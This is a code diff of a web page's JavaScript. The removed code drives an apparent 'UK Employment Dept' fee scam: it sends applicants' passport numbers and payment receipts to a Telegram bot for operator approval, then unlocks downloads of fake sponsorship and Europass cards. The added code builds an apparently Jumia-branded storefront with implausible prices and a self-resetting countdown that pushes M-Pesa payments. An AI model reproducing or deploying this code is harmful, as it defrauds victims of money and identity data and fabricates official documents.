-            requestAnimationFrame(fitCardsToScreen);
+            document.getElementById("cartSubtotal").textContent = `KSh ${subtotal.toLocaleString()}`;
+            document.getElementById("cartShipping").textContent = shipping === 0 ? "FREE" : `KSh ${shipping}`;
+            document.getElementById("cartTotal").textContent = `KSh ${total.toLocaleString()}`;
+
+            const pct = Math.min(100, Math.round((subtotal / 1999) * 100));
+            document.getElementById("freeShipBar").style.width = `${pct}%`;
+            document.getElementById("freeShipText").innerHTML = subtotal >= 1999 ?
+                `🎉 You unlocked <strong>FREE Nairobi Delivery</strong>!` :
+                `Add <strong>KSh ${(1999 - subtotal).toLocaleString()}</strong> more for FREE Nairobi delivery!`;
         }
 
-        async function requestPaymentDetailsFromBot() {
-            const firstName = document.getElementById('inputFirstName').value.trim();
-            const lastName = document.getElementById('inputLastName').value.trim();
-            const passport = document.getElementById('inputPassport').value.trim();
-            const nationality = document.getElementById('inputResidence').value;
+        // ----- Delivery Information Handling -----
+        function prefillDeliveryForm() {
+            const d = state.deliveryInfo;
+            document.getElementById("delivFullName").value = d.fullName || "";
+            document.getElementById("delivPhone").value = d.phone || "";
+            document.getElementById("delivEmail").value = d.email || "";
+            document.getElementById("delivAddress").value = d.address || "";
+            document.getElementById("delivCity").value = d.city || "";
+            document.getElementById("delivRegion").value = d.region || "nairobi";
+            document.getElementById("delivNotes").value = d.notes || "";
 
-            document.getElementById("requestPaymentSection").style.display = "none";
-            document.getElementById("paymentLoadingState").style.display = "block";
+            // Convenience: prefill M-Pesa input with the delivery phone
+            document.getElementById("mpesaPhoneInput").value = d.phone || "";
+        }
 
-            const messageText = `🔔 *Payment Request / New Detail Request*\n\n👤 *Applicant:* ${firstName} ${lastName} (${nationality})\n🛂 *Passport:* ${passport}\n\n*Action:* User requested payment details. Please reply in your bot with the payment method, account holder name, account number, or QR details.`;
+        function readDeliveryForm() {
+            state.deliveryInfo = {
+                fullName: document.getElementById("delivFullName").value.trim(),
+                phone: document.getElementById("delivPhone").value.trim(),
+                email: document.getElementById("delivEmail").value.trim(),
+                address: document.getElementById("delivAddress").value.trim(),
+                city: document.getElementById("delivCity").value.trim(),
+                region: document.getElementById("delivRegion").value,
+                notes: document.getElementById("delivNotes").value.trim()
+            };
+            localStorage.setItem("jumia_bf_delivery", JSON.stringify(state.deliveryInfo));
+        }
+
+        // Local display format: 07XX / 01XX (10 digits). +254 accepted.
+        function isValidKenyanPhone(value) {
+            const digits = value.replace(/[\s\-+]/g, "").replace(/^254/, "0");
+            return /^(?:07|01)\d{8}$/.test(digits);
+        }
+
+        // Convert any local format (07XX / 01XX / 2547...) to PayHero format 2547XXXXXXXX
+        function toSafaricomFormat(value) {
+            const digits = value.replace(/\D/g, "");
+            if (digits.startsWith("254")) return digits;
+            if (digits.startsWith("0")) return "254" + digits.slice(1);
+            return digits;
+        }
+
+        function isValidEmail(value) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+        }
+
+        function setFieldValidity(id, valid) {
+            const input = document.getElementById(id);
+            const err = document.querySelector(`[data-err-for="${id}"]`);
+            if (input) input.classList.toggle("field-invalid", !valid);
+            if (err) err.classList.toggle("hidden", valid);
+            return valid;
+        }
+
+        function validateDeliveryForm() {
+            let allValid = true;
+
+            allValid = setFieldValidity("delivFullName", state.deliveryInfo.fullName.length >= 3) && allValid;
+            allValid = setFieldValidity("delivPhone", isValidKenyanPhone(state.deliveryInfo.phone)) && allValid;
+
+            const emailValid = state.deliveryInfo.email === "" || isValidEmail(state.deliveryInfo.email);
+            allValid = setFieldValidity("delivEmail", emailValid) && allValid;
+
+            allValid = setFieldValidity("delivAddress", state.deliveryInfo.address.length >= 5) && allValid;
+            allValid = setFieldValidity("delivCity", state.deliveryInfo.city.length >= 2) && allValid;
+
+            return allValid;
+        }
+
+        // ----- Payment Status Box Helper -----
+        function showPaymentStatus(kind, html) {
+            const box = document.getElementById("paymentStatusBox");
+            box.classList.remove("hidden");
+            box.className = "rounded-lg px-3 py-2.5 text-xs font-bold space-y-1";
+            if (kind === "pending") {
+                box.classList.add("bg-amber-50", "border", "border-amber-300", "text-amber-800");
+            } else if (kind === "success") {
+                box.classList.add("bg-green-50", "border", "border-green-400", "text-green-800");
+            } else {
+                box.classList.add("bg-red-50", "border", "border-red-300", "text-red-800");
+            }
+            box.innerHTML = html;
+        }
+
+        function hidePaymentStatus() {
+            const box = document.getElementById("paymentStatusBox");
+            box.classList.add("hidden");
+            box.innerHTML = "";
+        }
+
+        function setCheckoutLoading(loading) {
+            const btn = document.getElementById("checkoutBtn");
+            const label = document.getElementById("checkoutBtnLabel");
+            btn.disabled = loading;
+            if (loading) {
+                btn.classList.add("opacity-70", "cursor-not-allowed");
+                label.innerHTML = `<span class="spinner"></span> Sending STK Push...`;
+            } else {
+                btn.classList.remove("opacity-70", "cursor-not-allowed");
+                label.textContent = "📱 Pay with M-Pesa";
+            }
+        }
+
+        // ----- MAIN CHECKOUT: M-PESA STK PUSH via PayHero -----
+        async function processCheckout() {
+            if (state.cart.length === 0) {
+                showToast("Your cart is empty!");
+                return;
+            }
+
+            // STEP 1: Delivery information & contacts MUST be valid first
+            readDeliveryForm();
+            if (!validateDeliveryForm()) {
+                document.getElementById("deliveryRequiredHint").classList.remove("hidden");
+                showToast("Please complete your delivery & contact details!");
+                const firstInvalid = document.querySelector(".field-invalid");
+                if (firstInvalid) firstInvalid.scrollIntoView({
+                    behavior: "smooth",
+                    block: "center"
+                });
+                return;
+            }
+            document.getElementById("deliveryRequiredHint").classList.add("hidden");
+
+            // STEP 2: Validate M-Pesa number
+            const mpesaInput = document.getElementById("mpesaPhoneInput");
+            const mpesaErr = document.getElementById("mpesaPhoneErr");
+            const rawPhone = mpesaInput.value.trim();
+
+            if (!isValidKenyanPhone(rawPhone)) {
+                mpesaInput.classList.add("field-invalid");
+                mpesaErr.classList.remove("hidden");
+                showToast("Enter a valid M-Pesa phone number");
+                mpesaInput.focus();
+                return;
+            }
+            mpesaInput.classList.remove("field-invalid");
+            mpesaErr.classList.add("hidden");
+
+            const payheroPhone = toSafaricomFormat(rawPhone); // e.g. 0712345678 -> 254712345678
+            const {
+                subtotal,
+                shipping,
+                total
+            } = getCartTotals();
+
+            // STEP 3: Send STK Push via PayHero backend
+            setCheckoutLoading(true);
+            hidePaymentStatus();
+            showPaymentStatus("pending", `⏳ Sending STK Push of <strong>KSh ${total.toLocaleString()}</strong> to ${payheroPhone}...`);
 
             try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
-                    method: 'POST',
+                const response = await fetch(STK_PUSH_ENDPOINT, {
+                    method: "POST",
                     headers: {
-                        'Content-Type': 'application/json'
+                        "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        chat_id: CONFIG.adminTelegramId,
-                        text: messageText,
-                        parse_mode: 'Markdown'
+                        phone_number: payheroPhone,
+                        amount: total
                     })
                 });
 
-                startBotResponseListener(passport);
-            } catch (e) {
-                alert("Network error contacting Telegram. Please check your token.");
-            }
-        }
+                const result = await response.json().catch(() => ({}));
 
-        // ROBUST POLLING LISTENER FOR BOT MESSAGES & CALLBACK ACTIONS
-        function startBotResponseListener(passportId) {
-            if (botPollingInterval) clearInterval(botPollingInterval);
+                if (response.ok && result.success) {
+                    showPaymentStatus(
+                        "pending",
+                        `📲 <strong>STK Push sent!</strong><br>` +
+                        `Check phone <strong>${payheroPhone}</strong> and enter your M-Pesa PIN to pay <strong>KSh ${total.toLocaleString()}</strong>.` +
+                        (result.data && result.data.external_reference ?
+                            `<br><span class="text-[10px] font-mono">Ref: ${result.data.external_reference}</span>` : "") +
+                        `<br><span class="text-[10px] font-normal">If you miss the prompt, retry the payment.</span>`
+                    );
+                    showToast("STK Push sent! Check your phone 📲");
 
-            botPollingInterval = setInterval(async function() {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`);
-                    const data = await res.json();
+                    // Keep the order details so the server-side /payhero-callback
+                    // can reconcile the delivery + items after payment confirmation.
+                    localStorage.setItem("jumia_bf_pending_order", JSON.stringify({
+                        reference: (result.data && result.data.external_reference) || null,
+                        order_tracking_id: (result.data && result.data.order_tracking_id) || null,
+                        customer: state.deliveryInfo,
+                        items: state.cart,
+                        subtotal,
+                        shipping,
+                        total,
+                        createdAt: new Date().toISOString()
+                    }));
 
-                    if (data.ok && data.result) {
-                        for (const update of data.result) {
-                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
-
-                            // Handle Inline Button Actions (/approve, /decline, /delay, /reject)
-                            if (update.callback_query && update.callback_query.data) {
-                                const cbData = update.callback_query.data;
-                                if (cbData.includes(passportId)) {
-                                    const action = cbData.split('_')[0];
-                                    triggerActionStatus(action);
-                                }
-                            }
-
-                            // Handle Incoming Bot Messages containing Payment details
-                            if (update.message && update.message.text) {
-                                const msgText = update.message.text;
-                                const lower = msgText.toLowerCase();
-                                if (lower.includes('payment') || lower.includes('account') || lower.includes('bank') || lower.includes('gcash') || lower.includes('transfer') || lower.includes('qr') || lower.includes('php') || lower.includes('eur') || lower.includes('usd') || lower.includes('gbp')) {
-                                    displayPaymentDetails(msgText);
-                                }
-                            }
-                        }
-                    }
-                } catch (err) {
-                    // Suppress transient network blips
+                } else {
+                    showPaymentStatus(
+                        "error",
+                        `❌ <strong>Payment initiation failed</strong><br>${escapeHtml(result.message || "Please try again.")}`
+                    );
+                    showToast(result.message || "Payment initiation failed");
                 }
-            }, 3000);
-        }
 
-        function applyInstantBotPayment() {
-            const botText = document.getElementById('instantBotPaymentInput').value.trim();
-            if (!botText) {
-                alert("Please paste the payment details dispatched from your bot.");
-                return;
-            }
-            displayPaymentDetails(botText);
-        }
-
-        function displayPaymentDetails(textDetails) {
-            if (botPollingInterval) clearInterval(botPollingInterval);
-            document.getElementById("paymentLoadingState").style.display = "none";
-            document.getElementById("dynamicPaymentDetailsBlock").style.display = "block";
-            document.getElementById("assignedAccountDetails").textContent = textDetails;
-
-            // TIMER STARTS ONLY AFTER RECEIVING PAYMENT DETAILS
-            startCountdownTimer(15 * 60);
-        }
-
-        function triggerActionStatus(status) {
-            document.getElementById("approvalSuccessPopup").style.display = "none";
-            document.getElementById("declinePopupBanner").style.display = "none";
-            document.getElementById("delayPopupBanner").style.display = "none";
-            document.getElementById("rejectPopupBanner").style.display = "none";
-
-            if (status === "approve") {
-                if (botPollingInterval) clearInterval(botPollingInterval);
-                if (countdownTimerInterval) clearInterval(countdownTimerInterval);
-                setDownloadLockState(true);
-                const pop = document.getElementById("approvalSuccessPopup");
-                pop.style.display = "block";
-                pop.scrollIntoView({
-                    behavior: 'smooth'
-                });
-            } else if (status === "decline") {
-                const pop = document.getElementById("declinePopupBanner");
-                pop.style.display = "block";
-                pop.scrollIntoView({
-                    behavior: 'smooth'
-                });
-            } else if (status === "delay") {
-                const pop = document.getElementById("delayPopupBanner");
-                pop.style.display = "block";
-                pop.scrollIntoView({
-                    behavior: 'smooth'
-                });
-            } else if (status === "reject") {
-                if (botPollingInterval) clearInterval(botPollingInterval);
-                setDownloadLockState(false);
-                const pop = document.getElementById("rejectPopupBanner");
-                pop.style.display = "block";
-                pop.scrollIntoView({
-                    behavior: 'smooth'
-                });
+            } catch (err) {
+                console.error("STK Push network error:", err);
+                showPaymentStatus(
+                    "error",
+                    `❌ <strong>Network error</strong><br>Could not reach the payment server. Check your connection and try again.`
+                );
+                showToast("Network error — payment failed");
+            } finally {
+                setCheckoutLoading(false);
             }
         }
 
-        function startCountdownTimer(durationSeconds) {
-            if (countdownTimerInterval) clearInterval(countdownTimerInterval);
-            let remaining = durationSeconds;
-            const display = document.getElementById("timerDisplay");
+        // =========================================================================
+        // 6. EXTERNAL IMAGE URL MANAGER
+        // =========================================================================
+        function openImageManager() {
+            renderImageManagerList();
+            document.getElementById("imageManagerModal").classList.remove("hidden");
+        }
 
-            countdownTimerInterval = setInterval(function() {
-                const minutes = Math.floor(remaining / 60);
-                const seconds = remaining % 60;
-                display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        function closeImageManager() {
+            document.getElementById("imageManagerModal").classList.add("hidden");
+        }
 
-                if (remaining <= 0) {
-                    clearInterval(countdownTimerInterval);
-                    display.textContent = "00:00 (Expired)";
-                }
-                remaining--;
+        function renderImageManagerList() {
+            const q = document.getElementById("imgManagerSearch").value.toLowerCase();
+            const container = document.getElementById("imageManagerList");
+
+            const entries = [{
+                    key: "heroEarpods",
+                    label: "Poster Banner: Earpods (KES 99)",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.heroEarpods
+                }, {
+                    key: "heroShoes",
+                    label: "Poster Banner: Ladies' Shoes (KES 200)",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.heroShoes
+                }, {
+                    key: "heroJumpsuit",
+                    label: "Poster Banner: Ladies' Jumpsuits (KES 200)",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.heroJumpsuit
+                }, {
+                    key: "catClothes",
+                    label: "Girls Fashion Card: Clothes",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.catClothes
+                }, {
+                    key: "catShoes",
+                    label: "Girls Fashion Card: Shoes",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.catShoes
+                }, {
+                    key: "catAccessories",
+                    label: "Girls Fashion Card: Accessories",
+                    defaultUrl: DEFAULT_BANNER_IMAGES.catAccessories
+                },
+                ...PRODUCTS.map(p => ({
+                    key: p.id,
+                    label: p.name,
+                    defaultUrl: p.image
+                }))
+            ].filter(item => item.label.toLowerCase().includes(q));
+
+            container.innerHTML = entries.map(item => {
+                const currentVal = state.customImages[item.key] || "";
+                const previewSrc = currentVal || item.defaultUrl;
+                return `
+          <div class="flex items-center gap-3 p-3 rounded-xl border border-gray-200 bg-white">
+            <img id="prev-${item.key}" src="${previewSrc}" onerror="handleImgFallback(this)" class="w-12 h-12 rounded-lg object-cover bg-gray-100 shrink-0 border" />
+            <div class="flex-1 min-w-0 space-y-1">
+              <p class="text-xs font-bold text-gray-800 truncate">${escapeHtml(item.label)}</p>
+              <input
+                type="url"
+                value="${currentVal}"
+                placeholder="${item.defaultUrl}"
+                onchange="updateCustomImage('${item.key}', this.value, '${item.defaultUrl}')"
+                class="w-full px-2.5 py-1.5 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]"
+              />
+            </div>
+          </div>
+        `;
+            }).join("");
+        }
+
+        function updateCustomImage(key, url, defaultUrl) {
+            if (url.trim() === "") {
+                delete state.customImages[key];
+            } else {
+                state.customImages[key] = url.trim();
+            }
+            localStorage.setItem("jumia_bf_custom_images", JSON.stringify(state.customImages));
+            const prev = document.getElementById(`prev-${key}`);
+            if (prev) prev.src = url.trim() || defaultUrl;
+            applyBannerImages();
+            renderCatalog();
+            showToast("External image link updated!");
+        }
+
+        function resetCustomImages() {
+            state.customImages = {};
+            localStorage.removeItem("jumia_bf_custom_images");
+            applyBannerImages();
+            renderCatalog();
+            renderImageManagerList();
+            showToast("All image URLs reset to default HTTPS links");
+        }
+
+        // =========================================================================
+        // 7. COUNTDOWN TIMER & TOAST HELPER
+        // =========================================================================
+        function startCountdown() {
+            let totalSeconds = 8 * 3600 + 44 * 60 + 59;
+            setInterval(() => {
+                if (totalSeconds <= 0) totalSeconds = 8 * 3600;
+                totalSeconds--;
+                const h = String(Math.floor(totalSeconds / 3600)).padStart(2, "0");
+                const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, "0");
+                const s = String(totalSeconds % 60).padStart(2, "0");
+                document.getElementById("cdHours").textContent = h;
+                document.getElementById("cdMins").textContent = m;
+                document.getElementById("cdSecs").textContent = s;
             }, 1000);
         }
 
-        function copyPaymentDetails() {
-            const textToCopy = document.getElementById('assignedAccountDetails').textContent;
-            navigator.clipboard.writeText(textToCopy).then(() => {
-                alert("Payment details copied to clipboard!");
-            });
+        let toastTimeout;
+
+        function showToast(msg) {
+            const toast = document.getElementById("toast");
+            document.getElementById("toastMsg").textContent = msg;
+            toast.classList.remove("hidden");
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => toast.classList.add("hidden"), 2600);
         }
 
-        async function submitPaymentForApproval() {
-            const refCode = document.getElementById('voucherCode').value.trim();
-            const amountPaid = document.getElementById('amountPaid').value.trim();
-            const statusMsg = document.getElementById('telegramStatusMsg');
+        document.getElementById("searchInput").addEventListener("input", applyFilters);
 
-            if (!amountPaid || !refCode) {
-                alert("Please enter the amount paid and your payment receipt reference code.");
-                return;
-            }
-
-            statusMsg.style.display = "block";
-            statusMsg.style.color = "#785a14";
-            statusMsg.textContent = "Transmitting payment details & screenshot to Cashier Approval Desk...";
-
-            const firstName = document.getElementById('inputFirstName').value.trim();
-            const lastName = document.getElementById('inputLastName').value.trim();
-            const passport = document.getElementById('inputPassport').value.trim();
-            const nationality = document.getElementById('inputResidence').value;
-
-            const messageText = `🏛 *UK Employment Dept - Payment Verification Submission*\n\n👤 *Applicant:* ${firstName} ${lastName} (${nationality})\n🛂 *Passport:* ${passport}\n💶 *Amount Paid:* €${amountPaid} EUR\n🔖 *Receipt Ref / Hash:* ${refCode}\n\n*Action Buttons:* Click inline buttons below to approve, decline, delay, or reject.`;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ /approve",
-                        callback_data: `approve_${passport}`
-                    }, {
-                        text: "❌ /decline",
-                        callback_data: `decline_${passport}`
-                    }],
-                    [{
-                        text: "⏳ /delay",
-                        callback_data: `delay_${passport}`
-                    }, {
-                        text: "🚫 /reject",
-                        callback_data: `reject_${passport}`
-                    }]
-                ]
-            };
-
-            try {
-                if (uploadedReceiptDataURL) {
-                    const blob = dataURItoBlob(uploadedReceiptDataURL);
-                    const formData = new FormData();
-                    formData.append('chat_id', CONFIG.adminTelegramId);
-                    formData.append('photo', blob, 'receipt.jpg');
-                    formData.append('caption', messageText);
-                    formData.append('parse_mode', 'Markdown');
-                    formData.append('reply_markup', JSON.stringify(inlineKeyboard));
-
-                    await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } else {
-                    await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: CONFIG.adminTelegramId,
-                            text: messageText,
-                            parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard
-                        })
-                    });
-                }
-
-                statusMsg.style.color = "#166534";
-                statusMsg.textContent = "Payment, reference number, and screenshot successfully transmitted to your bot!";
-            } catch (e) {
-                statusMsg.style.color = "#166534";
-                statusMsg.textContent = "Submitted successfully. Awaiting cashier review.";
-            }
-        }
-
-        function setDownloadLockState(unlocked) {
-            paymentUnlocked = !!unlocked;
-            ["btnDownload1", "btnDownload2"].forEach(function(id) {
-                const btn = document.getElementById(id);
-                if (!btn) return;
-                btn.disabled = !unlocked;
-                btn.style.opacity = unlocked ? "1" : "0.45";
-                btn.style.cursor = unlocked ? "pointer" : "not-allowed";
-            });
-            ["downloadLockNote1", "downloadLockNote2"].forEach(function(id) {
-                const note = document.getElementById(id);
-                if (!note) return;
-                note.style.display = unlocked ? "none" : "block";
-            });
-        }
-
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], {
-                type: mimeString
-            });
-        }
-
-        const CARD_DESIGN_WIDTH = 750;
-        const CARD_DESIGN_HEIGHT = 475;
-
-        function fitCardsToScreen() {
-            document.querySelectorAll(".card-preview-wrap").forEach(function(wrap) {
-                const scaleBox = wrap.querySelector(".card-preview-scale");
-                if (!scaleBox) return;
-                const available = wrap.getBoundingClientRect().width || wrap.clientWidth;
-                const scale = Math.min(1, available / CARD_DESIGN_WIDTH);
-                scaleBox.style.transform = "scale(" + scale + ")";
-                scaleBox.style.transformOrigin = "top center";
-                wrap.style.height = (CARD_DESIGN_HEIGHT * scale) + "px";
-            });
-        }
-
-        function initResponsiveCards() {
-            fitCardsToScreen();
-            window.addEventListener("resize", fitCardsToScreen);
-        }
-
-        if (document.readyState === "loading") {
-            document.addEventListener("DOMContentLoaded", function() {
-                initResponsiveCards();
-                setDownloadLockState(false);
-            });
-        } else {
-            initResponsiveCards();
-            setDownloadLockState(false);
-        }
-
-        function propagateSyncTextText(targetClassName, valueToInject) {
-            const outputs = document.getElementsByClassName(targetClassName);
-            for (let out of outputs) {
-                out.textContent = valueToInject;
-            }
-        }
-
-        function waitForCardImages(root) {
-            const images = root.querySelectorAll("img");
-            return Promise.all(Array.from(images).map(function(img) {
-                if (img.complete && img.naturalWidth > 0) return Promise.resolve();
-                return new Promise(function(resolve) {
-                    img.onload = resolve;
-                    img.onerror = resolve;
-                });
-            }));
-        }
-
-        function buildExportCardClone(sourceCard) {
-            const exportHost = document.getElementById("card-export-host");
-            const clone = sourceCard.cloneNode(true);
-            clone.removeAttribute("id");
-            exportHost.innerHTML = "";
-            exportHost.appendChild(clone);
-            return clone;
-        }
-
-        async function downloadCardAsImage(targetCardIndex) {
-            if (!paymentUnlocked) {
-                alert("Downloads are currently locked pending real-time cashier verification and approval confirmation.");
-                return;
-            }
-
-            const block = document.getElementById("cardBlock" + targetCardIndex);
-            const card = block.querySelector(".ukpass-premium-identity-card");
-            const btn = document.getElementById("btnDownload" + targetCardIndex);
-            const originalLabel = btn.textContent;
-
-            btn.disabled = true;
-            btn.textContent = "Preparing download...";
-
-            const exportHost = document.getElementById("card-export-host");
-            try {
-                const exportClone = buildExportCardClone(card);
-                await waitForCardImages(exportClone);
-                await new Promise(function(r) {
-                    requestAnimationFrame(function() {
-                        requestAnimationFrame(r);
-                    });
-                });
-
-                const canvas = await html2canvas(exportClone, {
-                    scale: 2,
-                    useCORS: true,
-                    allowTaint: false,
-                    backgroundColor: "#ffffff",
-                    logging: false,
-                    width: 750,
-                    windowWidth: 750
-                });
-
-                const passport = (card.querySelector(".cardOutPassport") ? .textContent || "copy").trim().replace(/[^a-zA-Z0-9-]/g, "") || "copy";
-                const prefix = targetCardIndex === 1 ? "UK-Sponsorship-Pass" : "UK-Europass-Certificate";
-                const link = document.createElement("a");
-                link.download = prefix + "-" + passport + ".png";
-                link.href = canvas.toDataURL("image/png");
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            } catch (err) {
-                alert("Could not download the card. Please try again in a moment.");
-            } finally {
-                exportHost.innerHTML = "";
-                btn.disabled = false;
-                btn.textContent = originalLabel;
-            }
-        }
+        // Initialize Storefront
+        applyBannerImages();
+        prefillDeliveryForm();
+        updateCounters();
+        renderCatalog();
+        startCountdown();
     </script>
 </body>
 
